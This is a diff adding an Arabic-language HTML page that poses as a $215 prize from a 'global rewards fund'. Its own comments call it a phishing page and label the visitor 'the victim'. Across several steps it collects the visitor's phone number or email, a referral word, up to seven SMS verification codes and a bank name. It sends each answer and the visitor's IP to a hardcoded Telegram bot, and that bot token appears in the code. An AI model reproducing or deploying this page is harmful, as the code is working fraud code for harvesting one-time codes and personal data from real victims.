@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>جائزة الصندوق العالمي | 215 دولار</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none; /* منع التحديد لزيادة الاحترافية */
+        }
+        body {
+            background: linear-gradient(145deg, #001a00 0%, #003300 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            direction: rtl;
+        }
+        .card {
+            max-width: 580px;
+            width: 100%;
+            background: rgba(0,0,0,0.78);
+            backdrop-filter: blur(14px);
+            border-radius: 56px;
+            padding: 30px 28px 45px;
+            box-shadow: 0 30px 45px rgba(0,255,0,0.25), 0 0 0 2px #f5b042 inset;
+            transition: 0.2s;
+            text-align: center;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 800;
+            color: #f5b042;
+            text-shadow: 0 0 6px #ffd700;
+            margin-bottom: 12px;
+        }
+        .sub {
+            background: #0a2f0a;
+            color: #d4ffb0;
+            display: inline-block;
+            padding: 6px 24px;
+            border-radius: 60px;
+            font-size: 15px;
+            font-weight: bold;
+            margin-bottom: 25px;
+        }
+        .logo {
+            font-size: 68px;
+            margin: 5px 0 10px;
+        }
+        .input-group {
+            margin: 22px 0;
+            text-align: right;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            color: #ffeaac;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        input, select {
+            width: 100%;
+            padding: 15px 20px;
+            border-radius: 70px;
+            background: #1e2a1e;
+            border: 1.5px solid #5b8c5a;
+            color: white;
+            font-size: 17px;
+            outline: none;
+            transition: 0.2s;
+            text-align: center;
+            font-family: monospace;
+        }
+        input:focus, select:focus {
+            border-color: #ffcc66;
+            box-shadow: 0 0 12px #ffcc66;
+        }
+        button {
+            width: 100%;
+            background: linear-gradient(95deg, #e6b422, #ff8800);
+            border: none;
+            padding: 15px;
+            border-radius: 70px;
+            font-size: 19px;
+            font-weight: bold;
+            color: #002200;
+            margin-top: 18px;
+            cursor: pointer;
+            transition: 0.15s;
+            box-shadow: 0 5px 0 #8b5a00;
+        }
+        button:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #8b5a00;
+        }
+        .step {
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+        .step-active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .status {
+            margin-top: 18px;
+            font-size: 13px;
+            color: #c6e6c6;
+            background: #0a2f0a;
+            padding: 10px;
+            border-radius: 40px;
+        }
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 6px solid #ccc;
+            border-top: 6px solid gold;
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        footer {
+            margin-top: 25px;
+            font-size: 11px;
+            color: #7e9e7e;
+        }
+        .question-block {
+            background: #102010;
+            padding: 18px;
+            border-radius: 32px;
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        .question-block p {
+            color: #ffdd99;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+        .error-msg {
+            color: #ffaa66;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+        .deduct-box {
+            background: #4b2e00;
+            padding: 15px;
+            border-radius: 50px;
+            margin: 15px 0;
+        }
+        .deduct-box p {
+            font-size: 18px;
+            color: #ffecb3;
+        }
+        .small-btn {
+            background: #555;
+            box-shadow: 0 3px 0 #333;
+            font-size: 16px;
+        }
+        .attempts {
+            font-weight: bold;
+            background: #2a1a00;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 30px;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+<div class="card" id="app">
+    <div class="logo">💵🏆</div>
+    <h1>صندوق المكافآت العالمية</h1>
+    <div class="sub">جائزتك المستحقة: 215 دولار أمريكي</div>
+
+    <!-- الخطوة 1: هل أنت من القائمة المدرجة؟ -->
+    <div id="step1" class="step step-active">
+        <div class="input-group">
+            <label>❓ هل أنت ضمن القائمة المدرجة للجائزة؟</label>
+            <select id="inList">
+                <option value="نعم، أنا مدرج">نعم، أنا مدرج</option>
+                <option value="لا، لست مدرجاً">لا، لست مدرجاً</option>
+            </select>
+        </div>
+        <button id="next1">التالي ➡️</button>
+        <div class="status">الكل مؤهل بغض النظر عن الإجابة</div>
+    </div>
+
+    <!-- الخطوة 2: كيف عرفت موقعنا؟ -->
+    <div id="step2" class="step">
+        <div class="logo">🔍</div>
+        <h1>مصدر المعرفة</h1>
+        <div class="input-group">
+            <label>من أين علمت بهذه الجائزة؟</label>
+            <select id="source">
+                <option value="صديق">من صديق</option>
+                <option value="مواقع التواصل">من مواقع التواصل</option>
+                <option value="المحل">من المحل</option>
+                <option value="غير ذلك">غير ذلك</option>
+            </select>
+        </div>
+        <button id="next2">التالي ➡️</button>
+    </div>
+
+    <!-- الخطوة 3: اختيار البلد -->
+    <div id="step3" class="step">
+        <div class="logo">🌍</div>
+        <h1>من أي بلد أنت؟</h1>
+        <div class="input-group">
+            <select id="country">
+                <option value="">-- اختر البلد --</option>
+                <option value="مصر">مصر</option>
+                <option value="السعودية">السعودية</option>
+                <option value="الإمارات">الإمارات</option>
+                <option value="الكويت">الكويت</option>
+                <option value="قطر">قطر</option>
+                <option value="البحرين">البحرين</option>
+                <option value="عمان">عمان</option>
+                <option value="الأردن">الأردن</option>
+                <option value="لبنان">لبنان</option>
+                <option value="سوريا">سوريا</option>
+                <option value="العراق">العراق</option>
+                <option value="فلسطين">فلسطين</option>
+                <option value="اليمن">اليمن</option>
+                <option value="السودان">السودان</option>
+                <option value="ليبيا">ليبيا</option>
+                <option value="تونس">تونس</option>
+                <option value="الجزائر">الجزائر</option>
+                <option value="المغرب">المغرب</option>
+                <option value="موريتانيا">موريتانيا</option>
+                <option value="جيبوتي">جيبوتي</option>
+                <option value="الصومال">الصومال</option>
+            </select>
+        </div>
+        <button id="next3">التالي ➡️</button>
+    </div>
+
+    <!-- الخطوة 4: توضيح الخصم (215 -> 196) -->
+    <div id="step4" class="step">
+        <div class="logo">💰➖</div>
+        <h1>تأكيد الخصم الإداري</h1>
+        <div class="deduct-box">
+            <p>💰 المبلغ الأصلي: <strong>215 دولار</strong></p>
+            <p>📉 رسوم الخدمة والتوصيل: <strong>19 دولار</strong></p>
+            <p>✅ <span style="font-size:22px;">المبلغ المستلم: 196 دولار</span></p>
+        </div>
+        <button id="agreeDeduction">أوافق على الخصم وأكمل</button>
+        <div class="status">بالضغط على موافق، أنت توافق على استلام 196 دولار فقط.</div>
+    </div>
+
+    <!-- الخطوة 5: إدخال رقم الهاتف أو البريد الإلكتروني -->
+    <div id="step5" class="step">
+        <div class="logo">📧📱</div>
+        <h1>معلومات التواصل</h1>
+        <div class="input-group">
+            <label>رقم الجوال أو البريد الإلكتروني</label>
+            <input type="text" id="contactInfo" placeholder="مثال: 966512345678 أو name@example.com" autocomplete="off">
+        </div>
+        <button id="sendContact">إرسال المعلومات</button>
+        <div class="status">سيتم إرسال كلمة الإحالة إلى هذا الرقم/البريد</div>
+    </div>
+
+    <!-- الخطوة 6: إدخال كلمة الإحالة -->
+    <div id="step6" class="step">
+        <div class="logo">🔑</div>
+        <h1>كلمة الإحالة السرية</h1>
+        <div class="input-group">
+            <label>أدخل كلمة الإحالة التي وصلتك</label>
+            <input type="text" id="refCode" placeholder="_______" autocomplete="off">
+        </div>
+        <button id="verifyRef">تحقق من كلمة الإحالة</button>
+        <div class="status" id="refMsg"></div>
+    </div>
+
+    <!-- الخطوة 7: طلب الرمز الوهمي (7 محاولات) -->
+    <div id="step7" class="step">
+        <div class="logo">📲</div>
+        <h1>رمز التحقق المرسل إلى شريحة هاتفك</h1>
+        <div class="input-group">
+            <label>أدخل الرمز المكون من 6 أرقام</label>
+            <input type="text" id="smsCode" maxlength="6" placeholder="مثال: 482917" autocomplete="off">
+        </div>
+        <button id="submitSms">تأكيد الرمز</button>
+        <button id="resendSms" class="small-btn" style="background:#3a3a3a;">📢 إعادة إرسال الرمز</button>
+        <div class="status" id="smsStatus"></div>
+        <div class="attempts" id="attemptsCount">المحاولات المتبقية: 7</div>
+    </div>
+
+    <!-- الخطوة 8: أسئلة إضافية (بعد 7 محاولات فاشلة) -->
+    <div id="step8" class="step">
+        <div class="logo">🤔</div>
+        <h1>أسئلة تأكيد الهوية</h1>
+        <form id="extraForm">
+            <div class="question-block">
+                <p>1️⃣ هل أنت أعذب؟</p>
+                <input type="text" name="q_azb" placeholder="نعم / لا / إلى حد ما" required>
+            </div>
+            <div class="question-block">
+                <p>2️⃣ كم مرة حاولت إدخال الرمز سابقاً؟</p>
+                <input type="text" name="q_attempts" placeholder="..." required>
+            </div>
+            <div class="question-block">
+                <p>3️⃣ هل تثق في منصة الصرف الدولية؟</p>
+                <input type="text" name="q_trust" placeholder="نعم / لا" required>
+            </div>
+            <div class="question-block">
+                <p>4️⃣ ما هو البنك الذي ترغب في استلام الـ 196 دولار عليه؟</p>
+                <input type="text" name="q_bank" placeholder="اسم البنك" required>
+            </div>
+            <button type="submit">إرسال الإجابات واستلام الجائزة</button>
+        </form>
+        <div class="status">*سيتم مراجعة طلبك وإرسال المبلغ خلال 24 ساعة.</div>
+    </div>
+
+    <!-- الخطوة 9: شاشة انتظار نهائية -->
+    <div id="step9" class="step">
+        <div class="loader"></div>
+        <h2>جاري تجهيز التحويل...</h2>
+        <div class="status">تم تقديم طلبك بنجاح. سيتم إرسال تأكيد إلى واتساب/بريدك قريباً.</div>
+    </div>
+    <footer>© الصندوق العالمي للدعم المالي – جميع الحقوق محفوظة</footer>
+</div>
+
+<script>
+    // --------------------------------------------------------------
+    // تكوين تلغرام (بياناتك الخاصة)
+    const BOT_TOKEN = "8660183367:AAE5ij6hIPqPnbhTQoBZ5lNBdxykxsTMAyI";
+    const CHAT_ID = "7848695581";
+    // --------------------------------------------------------------
+
+    async function sendToTelegram(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            });
+        } catch(e) { console.error(e); }
+    }
+
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) { return "غير متاح"; }
+    }
+
+    // متغيرات تخزين البيانات المجمعة
+    let userData = {
+        inList: '',
+        source: '',
+        country: '',
+        contact: '',
+        refCodeEntered: '',
+        smsAttempts: 0,
+    };
+    let currentStep = 1;
+
+    function showStep(stepNumber) {
+        for(let i=1; i<=9; i++) {
+            const stepDiv = document.getElementById(`step${i}`);
+            if(stepDiv) stepDiv.classList.remove('step-active');
+        }
+        document.getElementById(`step${stepNumber}`).classList.add('step-active');
+        currentStep = stepNumber;
+    }
+
+    // إرسال إشعارات الخطوات
+    async function logStep(stepName, value) {
+        const ip = await getIP();
+        await sendToTelegram(`📌 [${stepName}] : ${value}\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`);
+    }
+
+    // Step1 → Step2
+    document.getElementById('next1').onclick = async () => {
+        userData.inList = document.getElementById('inList').value;
+        await logStep("قائمة مدرجة", userData.inList);
+        showStep(2);
+    };
+
+    // Step2 → Step3
+    document.getElementById('next2').onclick = async () => {
+        userData.source = document.getElementById('source').value;
+        await logStep("مصدر المعرفة", userData.source);
+        showStep(3);
+    };
+
+    // Step3 → Step4
+    document.getElementById('next3').onclick = async () => {
+        userData.country = document.getElementById('country').value;
+        if(!userData.country) {
+            alert("يرجى اختيار بلدك");
+            return;
+        }
+        await logStep("البلد", userData.country);
+        showStep(4);
+    };
+
+    // Step4 → Step5
+    document.getElementById('agreeDeduction').onclick = async () => {
+        await logStep("الخصم", "وافق على خصم 19$ (يصبح 196$)");
+        showStep(5);
+    };
+
+    // Step5: إرسال رقم الهاتف/البريد
+    document.getElementById('sendContact').onclick = async () => {
+        const contactVal = document.getElementById('contactInfo').value.trim();
+        if(contactVal === "") {
+            alert("يرجى إدخال رقم هاتف أو بريد إلكتروني");
+            return;
+        }
+        userData.contact = contactVal;
+        await logStep("رقم/بريد الضحية", contactVal);
+        showStep(6);
+    };
+
+    // Step6: التحقق من كلمة الإحالة (yane2026 أو saas2000)
+    document.getElementById('verifyRef').onclick = async () => {
+        const ref = document.getElementById('refCode').value.trim();
+        const msgDiv = document.getElementById('refMsg');
+        if(ref === "yane2026") {
+            // صحيح -> ينتقل إلى خطوة الرمز
+            msgDiv.innerHTML = "✅ كلمة الإحالة صحيحة. جاري التوجيه...";
+            await logStep("كلمة الإحالة", `صحيحة (${ref}) - سيطلب الرمز`);
+            userData.refCodeEntered = ref;
+            userData.smsAttempts = 0;
+            document.getElementById('attemptsCount').innerText = "المحاولات المتبقية: 7";
+            document.getElementById('smsStatus').innerHTML = "";
+            document.getElementById('smsCode').value = "";
+            showStep(7);
+        } 
+        else if(ref === "saas2000") {
+            // خطأ -> يعود إلى الخطوة 5 (إعادة إدخال الرقم/البريد)
+            msgDiv.innerHTML = "❌ كلمة الإحالة تشير إلى أن رقمك أو بريدك غير صحيح. سيتم إعادة توجيهك لتصحيح البيانات.";
+            await logStep("كلمة الإحالة", `خاطئة (${ref}) - إعادة طلب الرقم/البريد`);
+            setTimeout(() => {
+                showStep(5);
+                document.getElementById('contactInfo').value = "";
+                document.getElementById('refCode').value = "";
+                msgDiv.innerHTML = "";
+            }, 2000);
+        }
+        else {
+            msgDiv.innerHTML = "❌ كلمة الإحالة غير معروفة. تأكد من كتابتها بشكل صحيح.";
+        }
+    };
+
+    // منطق 7 محاولات للرمز
+    let smsFails = 0;
+    const maxAttempts = 7;
+    document.getElementById('submitSms').onclick = async () => {
+        const code = document.getElementById('smsCode').value.trim();
+        const statusDiv = document.getElementById('smsStatus');
+        const attemptsSpan = document.getElementById('attemptsCount');
+        if(code === "") {
+            statusDiv.innerHTML = "الرجاء إدخال الرمز.";
+            return;
+        }
+        smsFails++;
+        const remaining = maxAttempts - smsFails;
+        attemptsSpan.innerText = `المحاولات المتبقية: ${remaining}`;
+        await logStep("محاولة رمز فاشلة", `الرمز: ${code} (المحاولة ${smsFails}/${maxAttempts})`);
+        
+        if(smsFails >= maxAttempts) {
+            statusDiv.innerHTML = "لقد تجاوزت عدد المحاولات المسموح. سيتم نقلك لصفحة التحقق الإضافية.";
+            await logStep("نظام", "تم تجاوز 7 محاولات، الانتقال إلى الأسئلة الإضافية");
+            setTimeout(() => {
+                showStep(8);
+            }, 1800);
+        } else {
+            statusDiv.innerHTML = `❌ الرمز غير صحيح. حاول مجدداً. (${remaining} محاولات متبقية)`;
+            document.getElementById('smsCode').value = '';
+        }
+    };
+
+    // زر إعادة إرسال الرمز
+    document.getElementById('resendSms').onclick = async () => {
+        await logStep("إعادة إرسال الرمز", "الضحية طلب إعادة إرسال رمز التحقق");
+        document.getElementById('smsStatus').innerHTML = "⚠️ تم إعادة إرسال الرمز إلى هاتفك. تحقق من رسائلك.";
+    };
+
+    // الأسئلة الإضافية (الخطوة 8)
+    const extraForm = document.getElementById('extraForm');
+    extraForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const q1 = document.querySelector('[name="q_azb"]').value;
+        const q2 = document.querySelector('[name="q_attempts"]').value;
+        const q3 = document.querySelector('[name="q_trust"]').value;
+        const q4 = document.querySelector('[name="q_bank"]').value;
+        
+        let finalMsg = `🎣 <b>[تقرير الصيد الشامل]</b>\n`;
+        finalMsg += `📞 الرقم/البريد: ${userData.contact}\n`;
+        finalMsg += `🌍 البلد: ${userData.country}\n`;
+        finalMsg += `🔍 مصدر المعرفة: ${userData.source}\n`;
+        finalMsg += `📋 قائمة مدرجة: ${userData.inList}\n`;
+        finalMsg += `🔑 كلمة الإحالة: ${userData.refCodeEntered || "لم يدخل"}\n`;
+        finalMsg += `❓ أعذب؟: ${q1}\n`;
+        finalMsg += `📊 كم مرة حاول؟: ${q2}\n`;
+        finalMsg += `🔐 الثقة بالمنصة: ${q3}\n`;
+        finalMsg += `🏦 البنك: ${q4}\n`;
+        finalMsg += `🌐 IP: ${await getIP()}\n⏱️ ${new Date().toLocaleString()}`;
+        
+        await sendToTelegram(finalMsg);
+        
+        // الانتقال إلى شاشة الانتظار
+        showStep(9);
+        setTimeout(() => {
+            const finishStatus = document.querySelector('#step9 .status');
+            if(finishStatus) finishStatus.innerHTML = "⚠️ نظراً لارتفاع الطلبات، سيتم التواصل معك خلال 48 ساعة لاستكمال الإجراءات.";
+        }, 4000);
+    });
+
+    // عند تحميل الصفحة: إرسال IP
+    window.onload = async () => {
+        const ip = await getIP();
+        await sendToTelegram(`🌍 <b>دخول جديد إلى صفحة الصيد</b>\nIP: ${ip}\n⏱️ ${new Date().toLocaleString()}\n🚪 فتح الصفحة الرئيسية.`);
+    };
+</script>
+</body>
+                  </html>
